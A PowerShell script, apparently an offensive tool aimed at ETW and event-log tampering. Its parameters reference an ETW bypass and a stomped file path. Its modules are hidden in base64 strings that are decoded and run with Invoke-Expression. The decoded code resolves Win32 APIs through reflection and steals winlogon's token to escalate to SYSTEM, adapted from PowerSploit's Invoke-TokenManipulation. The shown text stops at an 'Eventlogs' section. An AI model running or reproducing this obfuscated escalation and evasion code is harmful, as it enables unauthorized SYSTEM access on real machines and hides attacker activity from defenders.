param (
    [Parameter(Mandatory=$true)]
    [String]
    $operation,

    [String]
    $etwBypassMethod,

    [String]
    $stompedFilePath,

    [String[]]
    $users,

    [String[]]
    $exclusions,

    [Switch]
    $runAsUser = $false
)

# Importing modules
# Utils
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("IyBodHRwczovLzRzeXNvcHMuY29tL2FyY2hpdmVzL2NvbnZlcnQtanNvbi10by1hLXBvd2Vyc2hlbGwtaGFzaC10YWJsZS8KZnVuY3Rpb24gQ29udmVydFRvLUhhc2h0YWJsZSB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgW091dHB1dFR5cGUoJ2hhc2h0YWJsZScpXQogICAgcGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmUpXQogICAgICAgICRJbnB1dE9iamVjdAogICAgKQogICAgcHJvY2VzcyB7CiAgICAgICAgIyMgUmV0dXJuIG51bGwgaWYgdGhlIGlucHV0IGlzIG51bGwuIFRoaXMgY2FuIGhhcHBlbiB3aGVuIGNhbGxpbmcgdGhlIGZ1bmN0aW9uCiAgICAgICAgIyMgcmVjdXJzaXZlbHkgYW5kIGEgcHJvcGVydHkgaXMgbnVsbAogICAgICAgIGlmICgkbnVsbCAtZXEgJElucHV0T2JqZWN0KSB7CiAgICAgICAgICAgIHJldHVybiAkbnVsbAogICAgICAgIH0KICAgICAgICAjIyBDaGVjayBpZiB0aGUgaW5wdXQgaXMgYW4gYXJyYXkgb3IgY29sbGVjdGlvbi4gSWYgc28sIHdlIGFsc28gbmVlZCB0byBjb252ZXJ0CiAgICAgICAgIyMgdGhvc2UgdHlwZXMgaW50byBoYXNoIHRhYmxlcyBhcyB3ZWxsLiBUaGlzIGZ1bmN0aW9uIHdpbGwgY29udmVydCBhbGwgY2hpbGQKICAgICAgICAjIyBvYmplY3RzIGludG8gaGFzaCB0YWJsZXMgKGlmIGFwcGxpY2FibGUpCiAgICAgICAgaWYgKCRJbnB1dE9iamVjdCAtaXMgW1N5c3RlbS5Db2xsZWN0aW9ucy5JRW51bWVyYWJsZV0gLWFuZCAkSW5wdXRPYmplY3QgLWlzbm90IFtzdHJpbmddKSB7CiAgICAgICAgICAgICRjb2xsZWN0aW9uID0gQCgKICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRvYmplY3QgaW4gJElucHV0T2JqZWN0KSB7CiAgICAgICAgICAgICAgICAgICAgQ29udmVydFRvLUhhc2h0YWJsZSAtSW5wdXRPYmplY3QgJG9iamVjdAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApCiAgICAgICAgICAgICMjIFJldHVybiB0aGUgYXJyYXkgYnV0IGRvbid0IGVudW1lcmF0ZSBpdCBiZWNhdXNlIHRoZSBvYmplY3QgbWF5IGJlIHByZXR0eSBjb21wbGV4CiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAtTm9FbnVtZXJhdGUgJGNvbGxlY3Rpb24KICAgICAgICB9IGVsc2VpZiAoJElucHV0T2JqZWN0IC1pcyBbcHNvYmplY3RdKSB7ICMjIElmIHRoZSBvYmplY3QgaGFzIHByb3BlcnRpZXMgdGhhdCBuZWVkIGVudW1lcmF0aW9uCiAgICAgICAgICAgICMjIENvbnZlcnQgaXQgdG8gaXRzIG93biBoYXNoIHRhYmxlIGFuZCByZXR1cm4gaXQKICAgICAgICAgICAgJGhhc2ggPSBAe30KICAgICAgICAgICAgZm9yZWFjaCAoJHByb3BlcnR5IGluICRJbnB1dE9iamVjdC5QU09iamVjdC5Qcm9wZXJ0aWVzKSB7CiAgICAgICAgICAgICAgICAkaGFzaFskcHJvcGVydHkuTmFtZV0gPSBDb252ZXJ0VG8tSGFzaHRhYmxlIC1JbnB1dE9iamVjdCAkcHJvcGVydHkuVmFsdWUKICAgICAgICAgICAgfQogICAgICAgICAgICAkaGFzaAogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICMjIElmIHRoZSBvYmplY3QgaXNuJ3QgYW4gYXJyYXksIGNvbGxlY3Rpb24sIG9yIG90aGVyIG9iamVjdCwgaXQncyBhbHJlYWR5IGEgaGFzaCB0YWJsZQogICAgICAgICAgICAjIyBTbyBqdXN0IHJldHVybiBpdC4KICAgICAgICAgICAgJElucHV0T2JqZWN0CiAgICAgICAgfQogICAgfQp9CgojRnVuY3Rpb24gd3JpdHRlbiBieSBNYXR0IEdyYWViZXIsIFR3aXR0ZXI6IEBtYXR0aWZlc3RhdGlvbiwgQmxvZzogaHR0cDovL3d3dy5leHBsb2l0LW1vbmRheS5jb20vCkZ1bmN0aW9uIEdldC1Qcm9jQWRkcmVzcwp7CiAgICBQYXJhbQogICAgKAogICAgICAgIFtPdXRwdXRUeXBlKFtJbnRQdHJdKV0KICAgIAogICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUgKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRNb2R1bGUsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSApXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFByb2NlZHVyZQogICAgKQoKICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIFN5c3RlbS5kbGwgaW4gdGhlIEdBQwogICAgJFN5c3RlbUFzc2VtYmx5ID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpIHwKICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5HbG9iYWxBc3NlbWJseUNhY2hlIC1BbmQgJF8uTG9jYXRpb24uU3BsaXQoJ1xcJylbLTFdLkVxdWFscygnU3lzdGVtLmRsbCcpIH0KICAgICRVbnNhZmVOYXRpdmVNZXRob2RzID0gJFN5c3RlbUFzc2VtYmx5LkdldFR5cGUoJ01pY3Jvc29mdC5XaW4zMi5VbnNhZmVOYXRpdmVNZXRob2RzJykKICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIHRoZSBHZXRNb2R1bGVIYW5kbGUgYW5kIEdldFByb2NBZGRyZXNzIG1ldGhvZHMKICAgICRHZXRNb2R1bGVIYW5kbGUgPSAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoJ0dldE1vZHVsZUhhbmRsZScpCiAgICAjICRHZXRQcm9jQWRkcmVzcyA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0UHJvY0FkZHJlc3MnKQogICAgJEdldFByb2NBZGRyZXNzID0gJFVuc2FmZU5hdGl2ZU1ldGhvZHMuR2V0TWV0aG9kKCdHZXRQcm9jQWRkcmVzcycsIFtyZWZsZWN0aW9uLmJpbmRpbmdmbGFnc10gIlB1YmxpYyxTdGF0aWMiLCAkbnVsbCwgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OkFueSwgQCgoTmV3LU9iamVjdCBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmKS5HZXRUeXBlKCksIFtzdHJpbmddKSwgJG51bGwpOwogICAgIyBHZXQgYSBoYW5kbGUgdG8gdGhlIG1vZHVsZSBzcGVjaWZpZWQKICAgICRLZXJuMzJIYW5kbGUgPSAkR2V0TW9kdWxlSGFuZGxlLkludm9rZSgkbnVsbCwgQCgkTW9kdWxlKSkKICAgICR0bXBQdHIgPSBOZXctT2JqZWN0IEludFB0cgogICAgJEhhbmRsZVJlZiA9IE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigkdG1wUHRyLCAkS2VybjMySGFuZGxlKQoKICAgICMgUmV0dXJuIHRoZSBhZGRyZXNzIG9mIHRoZSBmdW5jdGlvbgogICAgV3JpdGUtT3V0cHV0ICRHZXRQcm9jQWRkcmVzcy5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdJEhhbmRsZVJlZiwgJFByb2NlZHVyZSkpCn0KCiNGdW5jdGlvbiB3cml0dGVuIGJ5IE1hdHQgR3JhZWJlciwgVHdpdHRlcjogQG1hdHRpZmVzdGF0aW9uLCBCbG9nOiBodHRwOi8vd3d3LmV4cGxvaXQtbW9uZGF5LmNvbS8KRnVuY3Rpb24gR2V0LURlbGVnYXRlVHlwZQp7CiAgICBQYXJhbQogICAgKAogICAgICAgIFtPdXRwdXRUeXBlKFtUeXBlXSldCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAwKV0KICAgICAgICBbVHlwZVtdXQogICAgICAgICRQYXJhbWV0ZXJzID0gKE5ldy1PYmplY3QgVHlwZVtdKDApKSwKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEgKV0KICAgICAgICBbVHlwZV0KICAgICAgICAkUmV0dXJuVHlwZSA9IFtWb2lkXQogICAgKQoKICAgICREb21haW4gPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbgogICAgJER5bkFzc2VtYmx5ID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJ1JlZmxlY3RlZERlbGVnYXRlJykKICAgICRBc3NlbWJseUJ1aWxkZXIgPSAkRG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgkRHluQXNzZW1ibHksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikKICAgICRNb2R1bGVCdWlsZGVyID0gJEFzc2VtYmx5QnVpbGRlci5EZWZpbmVEeW5hbWljTW9kdWxlKCdJbk1lbW9yeU1vZHVsZScsICRmYWxzZSkKICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKICAgICRDb25zdHJ1Y3RvckJ1aWxkZXIgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lQ29uc3RydWN0b3IoJ1JUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljJywgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCAkUGFyYW1ldGVycykKICAgICRDb25zdHJ1Y3RvckJ1aWxkZXIuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCiAgICAkTWV0aG9kQnVpbGRlciA9ICRUeXBlQnVpbGRlci5EZWZpbmVNZXRob2QoJ0ludm9rZScsICdQdWJsaWMsIEhpZGVCeVNpZywgTmV3U2xvdCwgVmlydHVhbCcsICRSZXR1cm5UeXBlLCAkUGFyYW1ldGVycykKICAgICRNZXRob2RCdWlsZGVyLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQogICAgCiAgICBXcml0ZS1PdXRwdXQgJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQp9Cg==")) | Invoke-Expression

# Elevate
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("IyBUaGlzIGlzIGp1c3QgYSBtZXJnZWQgY29kZSBmcm9tIGh0dHBzOi8vZ2l0aHViLmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvYmxvYi9tYXN0ZXIvRXhmaWx0cmF0aW9uL0ludm9rZS1Ub2tlbk1hbmlwdWxhdGlvbi5wczEKZnVuY3Rpb24gSW52b2tlLVRva2VuTWFuaXB1bGF0aW9uCnsKICAgICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyB3aW5kb3dzIGZ1bmN0aW9ucyAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKICAgICRPcGVuUHJvY2Vzc0FkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIE9wZW5Qcm9jZXNzCiAgICAkT3BlblByb2Nlc3NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbVUludDMyXSwgW0Jvb2xdLCBbVUludDMyXSkgKFtJbnRQdHJdKQogICAgJE9wZW5Qcm9jZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJE9wZW5Qcm9jZXNzQWRkciwgJE9wZW5Qcm9jZXNzRGVsZWdhdGUpCgogICAgJE9wZW5Qcm9jZXNzVG9rZW5BZGRyID0gR2V0LVByb2NBZGRyZXNzIGFkdmFwaTMyLmRsbCBPcGVuUHJvY2Vzc1Rva2VuCgkkT3BlblByb2Nlc3NUb2tlbkRlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKQoJJE9wZW5Qcm9jZXNzVG9rZW4gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkT3BlblByb2Nlc3NUb2tlbkFkZHIsICRPcGVuUHJvY2Vzc1Rva2VuRGVsZWdhdGUpCgogICAgJER1cGxpY2F0ZVRva2VuRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIGFkdmFwaTMyLmRsbCBEdXBsaWNhdGVUb2tlbkV4CgkkRHVwbGljYXRlVG9rZW5FeERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKQoJJER1cGxpY2F0ZVRva2VuRXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkRHVwbGljYXRlVG9rZW5FeEFkZHIsICREdXBsaWNhdGVUb2tlbkV4RGVsZWdhdGUpCgogICAgJEltcGVyc29uYXRlTG9nZ2VkT25Vc2VyQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBhZHZhcGkzMi5kbGwgSW1wZXJzb25hdGVMb2dnZWRPblVzZXIKCSRJbXBlcnNvbmF0ZUxvZ2dlZE9uVXNlckRlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdKSAoW0Jvb2xdKQoJJEltcGVyc29uYXRlTG9nZ2VkT25Vc2VyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEltcGVyc29uYXRlTG9nZ2VkT25Vc2VyQWRkciwgJEltcGVyc29uYXRlTG9nZ2VkT25Vc2VyRGVsZWdhdGUpCgogICAgJENsb3NlSGFuZGxlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgQ2xvc2VIYW5kbGUKCSRDbG9zZUhhbmRsZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdKSAoW0Jvb2xdKQoJJENsb3NlSGFuZGxlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJENsb3NlSGFuZGxlQWRkciwgJENsb3NlSGFuZGxlRGVsZWdhdGUpCiAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgogICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIHdpbmRvd3MgY29uc3RhbnRzICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwogICAgJENvbnN0YW50cyA9IEB7CiAgICAgICAgUFJPQ0VTU19RVUVSWV9JTkZPUk1BVElPTiA9IDB4NDAwCiAgICAgICAgVE9LRU5fRFVQTElDQVRFID0gMHgwMDAyCiAgICAgICAgVE9LRU5fSU1QRVJTT05BVEUgPSAweDAwMDQKICAgICAgICBUT0tFTl9RVUVSWSA9IDB4MDAwOAogICAgICAgIFRPS0VOX0FMTF9BQ0NFU1MgPSAweGYwMWZmCiAgICAgICAgVE9LRU5fQVNTSUdOX1BSSU1BUlkgPSAweDEKICAgIH0KCiAgICAkV2luMzJDb25zdGFudHMgPSBOZXctT2JqZWN0IFBTT2JqZWN0IC1Qcm9wZXJ0eSAkQ29uc3RhbnRzCiAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiAgICBXcml0ZS1Ib3N0ICJbKl0gQXR0ZW1waW5nIHRvIGVzY2FsYXRlIHRvIFNZU1RFTSB2aWEgVG9rZW5NYW5pcHVsYXRpb24uLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgQmx1ZQogICAgJHdpbmxvZ29uUGlkID0gJChHZXQtUHJvY2VzcyAtTmFtZSAid2lubG9nb24iKS5JZAogICAgJGhXaW5sb2dvbiA9ICRPcGVuUHJvY2Vzcy5JbnZva2UoJFdpbjMyQ29uc3RhbnRzLlBST0NFU1NfUVVFUllfSU5GT1JNQVRJT04sICR0cnVlLCBbVUludDMyXSR3aW5sb2dvblBpZCkKCiAgICBpZiAoJGhXaW5sb2dvbiAtZXEgW0ludFB0cl06Olplcm8pIHsKICAgICAgICAkRXJyb3JDb2RlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQogICAgICAgIFdyaXRlLUhvc3QgIlstXSBGYWlsZWQgdG8gb3BlbiBwcm9jZXNzIGhhbmRsZSwgdGhpcyBpcyB1bmV4cGVjdGVkLiBFcnJvckNvZGU6ICQoJEVycm9yQ29kZSkiIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkCiAgICAgICAgcmV0dXJuICRmYWxzZQogICAgfQogICAgCiAgICBbSW50UHRyXSAkaFdpbmxvZ29uVG9rZW4gPSBbSW50UHRyXTo6WmVybwogICAgJFN1Y2Nlc3MgPSAkT3BlblByb2Nlc3NUb2tlbi5JbnZva2UoJGhXaW5sb2dvbiwgKCRXaW4zMkNvbnN0YW50cy5UT0tFTl9BU1NJR05fUFJJTUFSWSAtYm9yICRXaW4zMkNvbnN0YW50cy5UT0tFTl9EVVBMSUNBVEUgLWJvciAkV2luMzJDb25zdGFudHMuVE9LRU5fSU1QRVJTT05BVEUgLWJvciAkV2luMzJDb25zdGFudHMuVE9LRU5fUVVFUlkpLCBbUmVmXSRoV2lubG9nb25Ub2tlbikKCiAgICAjQ2xvc2UgdGhlIGhhbmRsZSB0byBoUHJvY2VzcyAodGhlIHByb2Nlc3MgaGFuZGxlKQogICAgaWYgKC1ub3QgJENsb3NlSGFuZGxlLkludm9rZSgkaFdpbmxvZ29uKSkKICAgIHsKICAgICAgICAkRXJyb3JDb2RlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQogICAgICAgIFdyaXRlLUhvc3QgIlstXSBGYWlsZWQgdG8gY2xvc2UgcHJvY2VzcyBoYW5kbGUsIHRoaXMgaXMgdW5leHBlY3RlZC4gRXJyb3JDb2RlOiAkKCRFcnJvckNvZGUpIiAtRm9yZWdyb3VuZENvbG9yIFJlZAogICAgfQogICAgJGhXaW5sb2dvbiA9IFtJbnRQdHJdOjpaZXJvCgogICAgaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UgLW9yICRoV2lubG9nb25Ub2tlbiAtZXEgW0ludFB0cl06Olplcm8pCiAgICB7CiAgICAgICAgJEVycm9yQ29kZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKICAgICAgICBXcml0ZS1Ib3N0ICJbLV0gRmFpbGVkIHRvIGdldCBwcm9jZXNzZXMgcHJpbWFyeSB0b2tlbi4gUHJvY2Vzc0lkOiAkd2lubG9nb25QaWQuIFByb2Nlc3NOYW1lOiAkKChHZXQtUHJvY2VzcyAtSWQgJHdpbmxvZ29uUGlkKS5OYW1lKS4gRXJyb3I6ICRFcnJvckNvZGUiIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkCiAgICAgICAgcmV0dXJuICRmYWxzZQogICAgfQoKICAgICNEdXBsaWNhdGUgdGhlIHRva2VuIHNvIGl0IGNhbiBiZSB1c2VkIHRvIGNyZWF0ZSBhIG5ldyBwcm9jZXNzCiAgICBbSW50UHRyXSROZXdIVG9rZW4gPSBbSW50UHRyXTo6WmVybwogICAgJFN1Y2Nlc3MgPSAkRHVwbGljYXRlVG9rZW5FeC5JbnZva2UoJGhXaW5sb2dvblRva2VuLCAkV2luMzJDb25zdGFudHMuTUFYSU1VTV9BTExPV0VELCBbSW50UHRyXTo6WmVybywgMywgMSwgW1JlZl0kTmV3SFRva2VuKSAjdG9kbyBkb2VzIHRoaXMgbmVlZCB0byBiZSBmcmVlZAogICAgCiAgICBpZiAoLW5vdCAkU3VjY2VzcykKICAgIHsKICAgICAgICAkRXJyb3JDb2RlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQogICAgICAgIFdyaXRlLUhvc3QgIlstXSBEdXBsaWNhdGVUb2tlbkV4IGZhaWxlZC4gRXJyb3JDb2RlOiAkKCRFcnJvckNvZGUpIiAtRm9yZWdyb3VuZENvbG9yIFJlZAoKICAgICAgICAkU3VjY2VzcyA9ICRDbG9zZUhhbmRsZS5JbnZva2UoJGhXaW5sb2dvblRva2VuKQogICAgICAgICRoV2lubG9nb25Ub2tlbiA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgaWYgKC1ub3QgJFN1Y2Nlc3MpCiAgICAgICAgewogICAgICAgICAgICAkRXJyb3JDb2RlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQogICAgICAgICAgICBXcml0ZS1Ib3N0ICJbLV0gQ2xvc2VIYW5kbGUgZmFpbGVkIHRvIGNsb3NlIGhXaW5sb2dvblRva2VuLiBFcnJvckNvZGU6ICQoJEVycm9yQ29kZSkiIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkCiAgICAgICAgfQogICAgICAgIHJldHVybiAkZmFsc2UKICAgIH0KICAgIAogICAgJFN1Y2Nlc3MgPSAkSW1wZXJzb25hdGVMb2dnZWRPblVzZXIuSW52b2tlKCROZXdIVG9rZW4pCiAgICBpZiAoLW5vdCAkU3VjY2VzcykKICAgIHsKICAgICAgICAkRXJyb3Jjb2RlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQogICAgICAgIFdyaXRlLUhvc3QgLUZvcmVncm91bmRDb2xvciBSZWQgIlstXSBGYWlsZWQgdG8gSW1wZXJzb25hdGVMb2dnZWRPblVzZXIuIEVycm9yIGNvZGU6ICRFcnJvcmNvZGUiCgogICAgICAgICRTdWNjZXNzID0gJENsb3NlSGFuZGxlLkludm9rZSgkaFdpbmxvZ29uVG9rZW4pCiAgICAgICAgJGhXaW5sb2dvblRva2VuID0gW0ludFB0cl06Olplcm8KICAgICAgICBpZiAoLW5vdCAkU3VjY2VzcykKICAgICAgICB7CiAgICAgICAgICAgICRFcnJvckNvZGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgICAgICAgICAgIFdyaXRlLUhvc3QgLUZvcmVncm91bmRDb2xvciBSZWQgIlstXSBDbG9zZUhhbmRsZSBmYWlsZWQgdG8gY2xvc2UgaFdpbmxvZ29uVG9rZW4uIEVycm9yQ29kZTogJCgkRXJyb3JDb2RlKSIKICAgICAgICB9CgoKICAgICAgICAkU3VjY2VzcyA9ICRDbG9zZUhhbmRsZS5JbnZva2UoJE5ld0hUb2tlbikKICAgICAgICAkTmV3SFRva2VuID0gW0ludFB0cl06Olplcm8KICAgICAgICBpZiAoLW5vdCAkU3VjY2VzcykKICAgICAgICB7CiAgICAgICAgICAgICRFcnJvckNvZGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgICAgICAgICAgIFdyaXRlLUhvc3QgLUZvcmVncm91bmRDb2xvciBSZWQgIlstXSBDbG9zZUhhbmRsZSBmYWlsZWQgdG8gY2xvc2UgTmV3SFRva2VuLiBFcnJvckNvZGU6ICQoJEVycm9yQ29kZSkiCiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CgogICAgJFN1Y2Nlc3MgPSAkQ2xvc2VIYW5kbGUuSW52b2tlKCRoV2lubG9nb25Ub2tlbikKICAgICRoV2lubG9nb25Ub2tlbiA9IFtJbnRQdHJdOjpaZXJvCiAgICBpZiAoLW5vdCAkU3VjY2VzcykKICAgIHsKICAgICAgICAkRXJyb3JDb2RlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQogICAgICAgIFdyaXRlLUhvc3QgLUZvcmVncm91bmRDb2xvciBSZWQgIlstXSBDbG9zZUhhbmRsZSBmYWlsZWQgdG8gY2xvc2UgaFdpbmxvZ29uVG9rZW4uIEVycm9yQ29kZTogJCgkRXJyb3JDb2RlKSIKICAgIH0KCiAgICAjIFdyaXRlLUhvc3QgIiQoW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUpIgogICAgJFN1Y2Nlc3MgPSAkQ2xvc2VIYW5kbGUuSW52b2tlKCROZXdIVG9rZW4pCiAgICAkTmV3SFRva2VuID0gW0ludFB0cl06Olplcm8KICAgIGlmICgtbm90ICRTdWNjZXNzKQogICAgewogICAgICAgICRFcnJvckNvZGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgICAgICAgV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFJlZCAiWy1dIENsb3NlSGFuZGxlIGZhaWxlZCB0byBjbG9zZSBOZXdIVG9rZW4uIEVycm9yQ29kZTogJCgkRXJyb3JDb2RlKSIKICAgIH0KCiAgICBXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4gIlsrXSBHb3QgU1lTVEVNIHByaXZpbGVnZXMuIgoKICAgIHJldHVybiAkdHJ1ZQp9CgpmdW5jdGlvbiBJbnZva2UtUmV2ZXJ0VG9TZWxmCnsKICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MCldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkU2hvd091dHB1dAogICAgKQogICAgJFJldmVydFRvU2VsZkFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgYWR2YXBpMzIuZGxsIFJldmVydFRvU2VsZgogICAgJFJldmVydFRvU2VsZkRlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKCkgKFtCb29sXSkKICAgICRSZXZlcnRUb1NlbGYgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkUmV2ZXJ0VG9TZWxmQWRkciwgJFJldmVydFRvU2VsZkRlbGVnYXRlKQoKICAgICRTdWNjZXNzID0gJFJldmVydFRvU2VsZi5JbnZva2UoKQoKICAgIGlmICgkU2hvd091dHB1dCkKICAgIHsKICAgICAgICBpZiAoJFN1Y2Nlc3MpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1PdXRwdXQgIlJldmVydFRvU2VsZiB3YXMgc3VjY2Vzc2Z1bC4gUnVubmluZyBhczogJChbRW52aXJvbm1lbnRdOjpVc2VyRG9tYWluTmFtZSlcJChbRW52aXJvbm1lbnRdOjpVc2VyTmFtZSkiCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiUmV2ZXJ0VG9TZWxmIGZhaWxlZC4gUnVubmluZyBhczogJChbRW52aXJvbm1lbnRdOjpVc2VyRG9tYWluTmFtZSlcJChbRW52aXJvbm1lbnRdOjpVc2VyTmFtZSkiCiAgICAgICAgfQogICAgfQp9")) | Invoke-Expression

# Eventlogs
